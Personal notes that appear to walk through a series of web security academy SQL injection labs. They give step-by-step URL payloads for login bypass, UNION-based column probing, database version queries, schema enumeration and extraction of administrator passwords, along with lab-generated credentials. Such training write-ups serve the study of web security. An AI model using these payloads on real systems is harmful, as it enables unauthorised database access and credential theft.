SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

	https://ac3a1faa1f1cd9be80dc2c2e00ff00b9.web-security-academy.net/filter?category=All'+OR+1=1--
	Add to the end of the url the following string: filter?category=All'+OR+1=1--
	

SQL injection vulnerability allowing login bypass
	Go the login page
	type in the username field: administrator'--
	This username triggers the server to produce a SQL statement that matching first the username
	as the administrator, treats the rest of the statement where the password matching happens as a comment
	Hence, it doesn't check the password of the user entered
	type anything in the password field
	
	
SQL injection UNION attack, determining the number of columns returned by the query
	As the lab description says there is a vulnerability in the cateogory filter
	Click on a category
	Change the category parameter in the url with: '+UNION+SELECT+NULL--
	Error occurs. That means that the column is not 1. Increase NULL by 1
	'+UNION+SELECT+NULL,NULL--
	Again an error occurs. Increase by 1.
	'+UNION+SELECT+NULL,NULL,NULL--
	This time the error disappears. So the columns selected from the initial select clause are 3
	

SQL injection UNION attack, finding a column containing text
	This lab continues the result from the previous lab, so remember how many columns you decided that there are in the select clause
	(mine was 3)
	For me also I want the new line to contain the string '4iiJ4K'
	So taking the UNION clause from the previous lab, I substitute first the first column with this random string
	'+UNION+SELECT+'4iiJ4K',NULL,NULL--
	An error occurs, so the first column doesn't contain text. Let's do the same for the second column
	'+UNION+SELECT+NULL,'4iiJ4K',NULL--
	No error occurs. You can see in the last line of the results the random string printed
	
	
SQL injection UNION attack, retrieving data from other tables
	Choose any category
	Go to the category parameter in the URL
	What we want is to select the username and password fields from the existing users table, in order to see all he usernames and the passwords
	First we must find the correct number of columns
	An error appears, try for 2 columns
	'+UNION+SELECT+NULL,NULL--+
	The error disappears, so there are 2 columns. Now want to test which contain text
	'+UNION+SELECT+NULL,'a'--+
	'+UNION+SELECT+'a',NULL--+
	No error appears, both columns contain text. Now select the columns that contain the usernames and passwords
	'+UNION+SELECT+username,password+FROM+users--
	We see the credentials of the administrator. Go to the login page and put these credentials
	
	
	
SQL injection attack, querying the database type and version on Oracle
	First we must determine the number of columns of the first select clause. We know already the table from which we want to get the version: v$version 
	Remember that oracle DB Select queries MUST say from which table to select data (FROM)
	'+UNION+SELECT+NULL+FROM+v$version--
	We get an error. Let's try 2 columns
	'+UNION+SELECT+NULL,NULL+FROM+v$version--
	The error disappears, so there are 2 columns. Now want to test which contain text
	'+UNION+SELECT+'a',NULL+FROM+v$version--
	No error appears. That is the first column accepts text. Also, the second accepts text
	'+UNION+SELECT+'a','b'+FROM+v$version--
	Now we want to get the version of the oracle DB
	'+UNION+SELECT+banner,NULL+FROM+v$version--
	or run:
	'+UNION+SELECT+NULL,banner+FROM+v$version--
	We see all the version information in the table. The information may be together or they may be dispersed in different places on the website
	
	
	
SQL injection attack, querying the database type and version on MySQL and Microsoft
	First we must find how many columns the select clause must take. Remember that comments in MySQL MUST have a whitespace after the --.
	That's the point of the extra + in the end
	'+UNION+SELECT+NULL--+
	An error appears, try for 2 columns
	'+UNION+SELECT+NULL,NULL--+
	The error disappears, so there are 2 columns. Now want to test which contain text
	'+UNION+SELECT+'a',NULL--+
	No error appears, the first column accepts text. No need to proceed with the second column we want only the version string which is one column
	'+UNION+SELECT+@@version,NULL--+
	

SQL injection attack, listing the database contents on non-Oracle databases
	First we must find the correct number of columns
	An error appears, try for 2 columns
	'+UNION+SELECT+NULL,NULL--+
	The error disappears, so there are 2 columns. Now want to test which contain text
	'+UNION+SELECT+NULL,'a'--+
	'+UNION+SELECT+'a',NULL--+
	No error appears, both columns contain text. Now we want to learn the name of the table that might contain the credentials
	'+UNION+SELECT+TABLE_NAME,NULL+FROM+information_schema.tables--+
	We learn this way the names of all the tables. We find a certain table that is probably the user credentials table 'users_mbfbck'
	We want to see now the structure of that table, in order to query the correct columns
	+UNION+SELECT+TABLE_NAME,COLUMN_NAME+FROM+information_schema.columns+WHERE+TABLE_NAME='users_mbfbck'--+
	We see the names of the columns of the table. Now we query the table to show these 2 columns
	'+UNION+SELECT+username_rxyjcb,password_jogckh+FROM+users_mbfbck--+
	(We could also add a where clause to search directly for the administator)
	We see here the username adminstrator and the password: etclgxu27m0ce4ow0zyi
	We go to the login page, add the credentials and voila!
	

SQL injection attack, listing the database contents on Oracle
	We find the correct number of columns:
	'+UNION+SELECT+NULL+FROM+DUAL--
	Error appears
	'+UNION+SELECT+NULL,NULL+FROM+DUAL--
	Number of columns is 2
	'+UNION+SELECT+'a',NULL+FROM+DUAL--
	'+UNION+SELECT+NULL,'a'+FROM+DUAL--
	No error appears, both columns accept text
	Get all the table names
	'+UNION+SELECT+TABLE_NAME,NULL+FROM+all_tables--
	We find a table USERS_PGRACY that might containt the users' credentials. We query for its columns
	+UNION+SELECT+TABLE_NAME,COLUMN_NAME+FROM+all_tab_columns+WHERE+TABLE_NAME='USERS_PGRACY'--
	We query for the contents of those columns
	'+UNION+SELECT+USERNAME_TKYCZV,PASSWORD_CJYXDE+FROM+USERS_PGRACY--
	We see the user administrator with his password. We login with these credentials

		
SQL injection UNION attack, retrieving multiple values in a single column
	First we must find the correct number of columns
	An error appears, try for 2 columns
	'+UNION+SELECT+NULL,NULL--+
	The error disappears, so there are 2 columns. Now want to test which contain text
	'+UNION+SELECT+'a',NULL--+
	Error appears, first column doesn't contain text
	'+UNION+SELECT+NULL,'a'--+
	No error appears, second column contains text.
	Get the username and password concatenated in the 2nd column with delimiter '--' since only that contains text
	'+UNION+SELECT+NULL,username+||'--'||+password+FROM+users--
	We see: administrator--di51zyvf7p1kgatsuv37
	That means that the user adminstrator has the password di51zyvf7p1kgatsuv37
